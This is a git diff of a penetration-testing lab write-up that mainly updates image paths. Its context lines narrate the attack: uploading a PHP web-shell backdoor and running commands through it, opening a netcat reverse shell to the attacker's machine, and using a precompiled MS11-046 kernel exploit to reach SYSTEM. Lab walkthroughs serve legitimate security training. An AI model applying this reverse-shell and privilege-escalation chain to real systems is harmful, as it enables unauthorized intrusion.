@@ -165,9 +165,9 @@ Enumerated top 200 UDP ports:
 
 #### -Navigated to "http://192.168.100.46:242" and required a login. Input the found user "offsec" and password "elite" andwas able to login showing the following webpage:
 
-![](../Images/Pasted%20image%2020220617222348.png)
+![](Pasted%20image%2020221001115137.png)
 
-![](../Images/Pasted%20image%2020220617222519.png)
+![](Pasted%20image%2020221001115213.png)
 
 
 ---
@@ -185,7 +185,7 @@ Enumerated top 200 UDP ports:
 
 #### -Uploaded "simplephpbackdoor.php" 
 
-![](../Images/Pasted%20image%2020220617234041.png)
+![](Pasted%20image%2020221001115235.png)
 
 ## Port 242
 
@@ -193,13 +193,13 @@ Enumerated top 200 UDP ports:
 
 #### -Navigated to "http://192.168.69.46:242/simplephpbackdoor.php?cmd=dir" and found we had remote code execution:
 
-![](../Images/Pasted%20image%2020220617234709.png)
+![](Pasted%20image%2020221001115307.png)
 
 #simplephpbackdoorRCE
 
 #### -Typed "locate nc.exe" on kali machine and typed "cp /usr/share/windows-resources/binaries/nc.exe ." to copy the nc.exe binary into kali machine home directory:
 
-![](../Images/Pasted%20image%2020220618183102.png)
+![](Pasted%20image%2020221001115341.png)
 
 #### -Typed "ftp 192.168.69.46" and logged in with user admin and password admin
 
@@ -210,7 +210,7 @@ Enumerated top 200 UDP ports:
 
 #### -Navigated to "http://192.168.69.46:242/simplephpbackdoor.php?cmd=nc.exe [kali machine IP] 3145 -e cmd" and received a command prompt:
 
-![](../Images/Pasted%20image%2020220618184046.png)
+![](Pasted%20image%2020221001115406.png)
 
 
 ---
@@ -259,15 +259,15 @@ Network Card(s):           N/A
 
 #### -Googled "6.0.6001 Service Pack 1 Build 6001 exploit"  and found the following webpage with exploit MS11-046:
 
-![](../Images/Pasted%20image%2020220622211042.png)
+![](Pasted%20image%2020221001115431.png)
 
-![](../Images/Pasted%20image%2020220622211403.png)
+![](Pasted%20image%2020221001115452.png)
 
 #### -As the exploit show above was not already precompiled I navigated to "https://github.com/SecWiki/windows-kernel-exploits" as the webpage had a precompiled MS11-046 exploit:
 
-![](../Images/Pasted%20image%2020220622211928.png)
+![](Pasted%20image%2020221001115515.png)
 
-![](../Images/Pasted%20image%2020220622220507.png)
+![](Pasted%20image%2020221001115534.png)
 
 #### -Downloaded the complied MS11-046 exploit to my kali machine
 
@@ -279,5 +279,5 @@ Network Card(s):           N/A
 
 #### -Typed "ms11-046.exe" and received a command prompt running as nt authority\system:
 
-![](../Images/Pasted%20image%2020220622222108.png)
+![](Pasted%20image%2020221001115612.png)
 ![](../Images/Pasted%20image%2020220622221842.png)
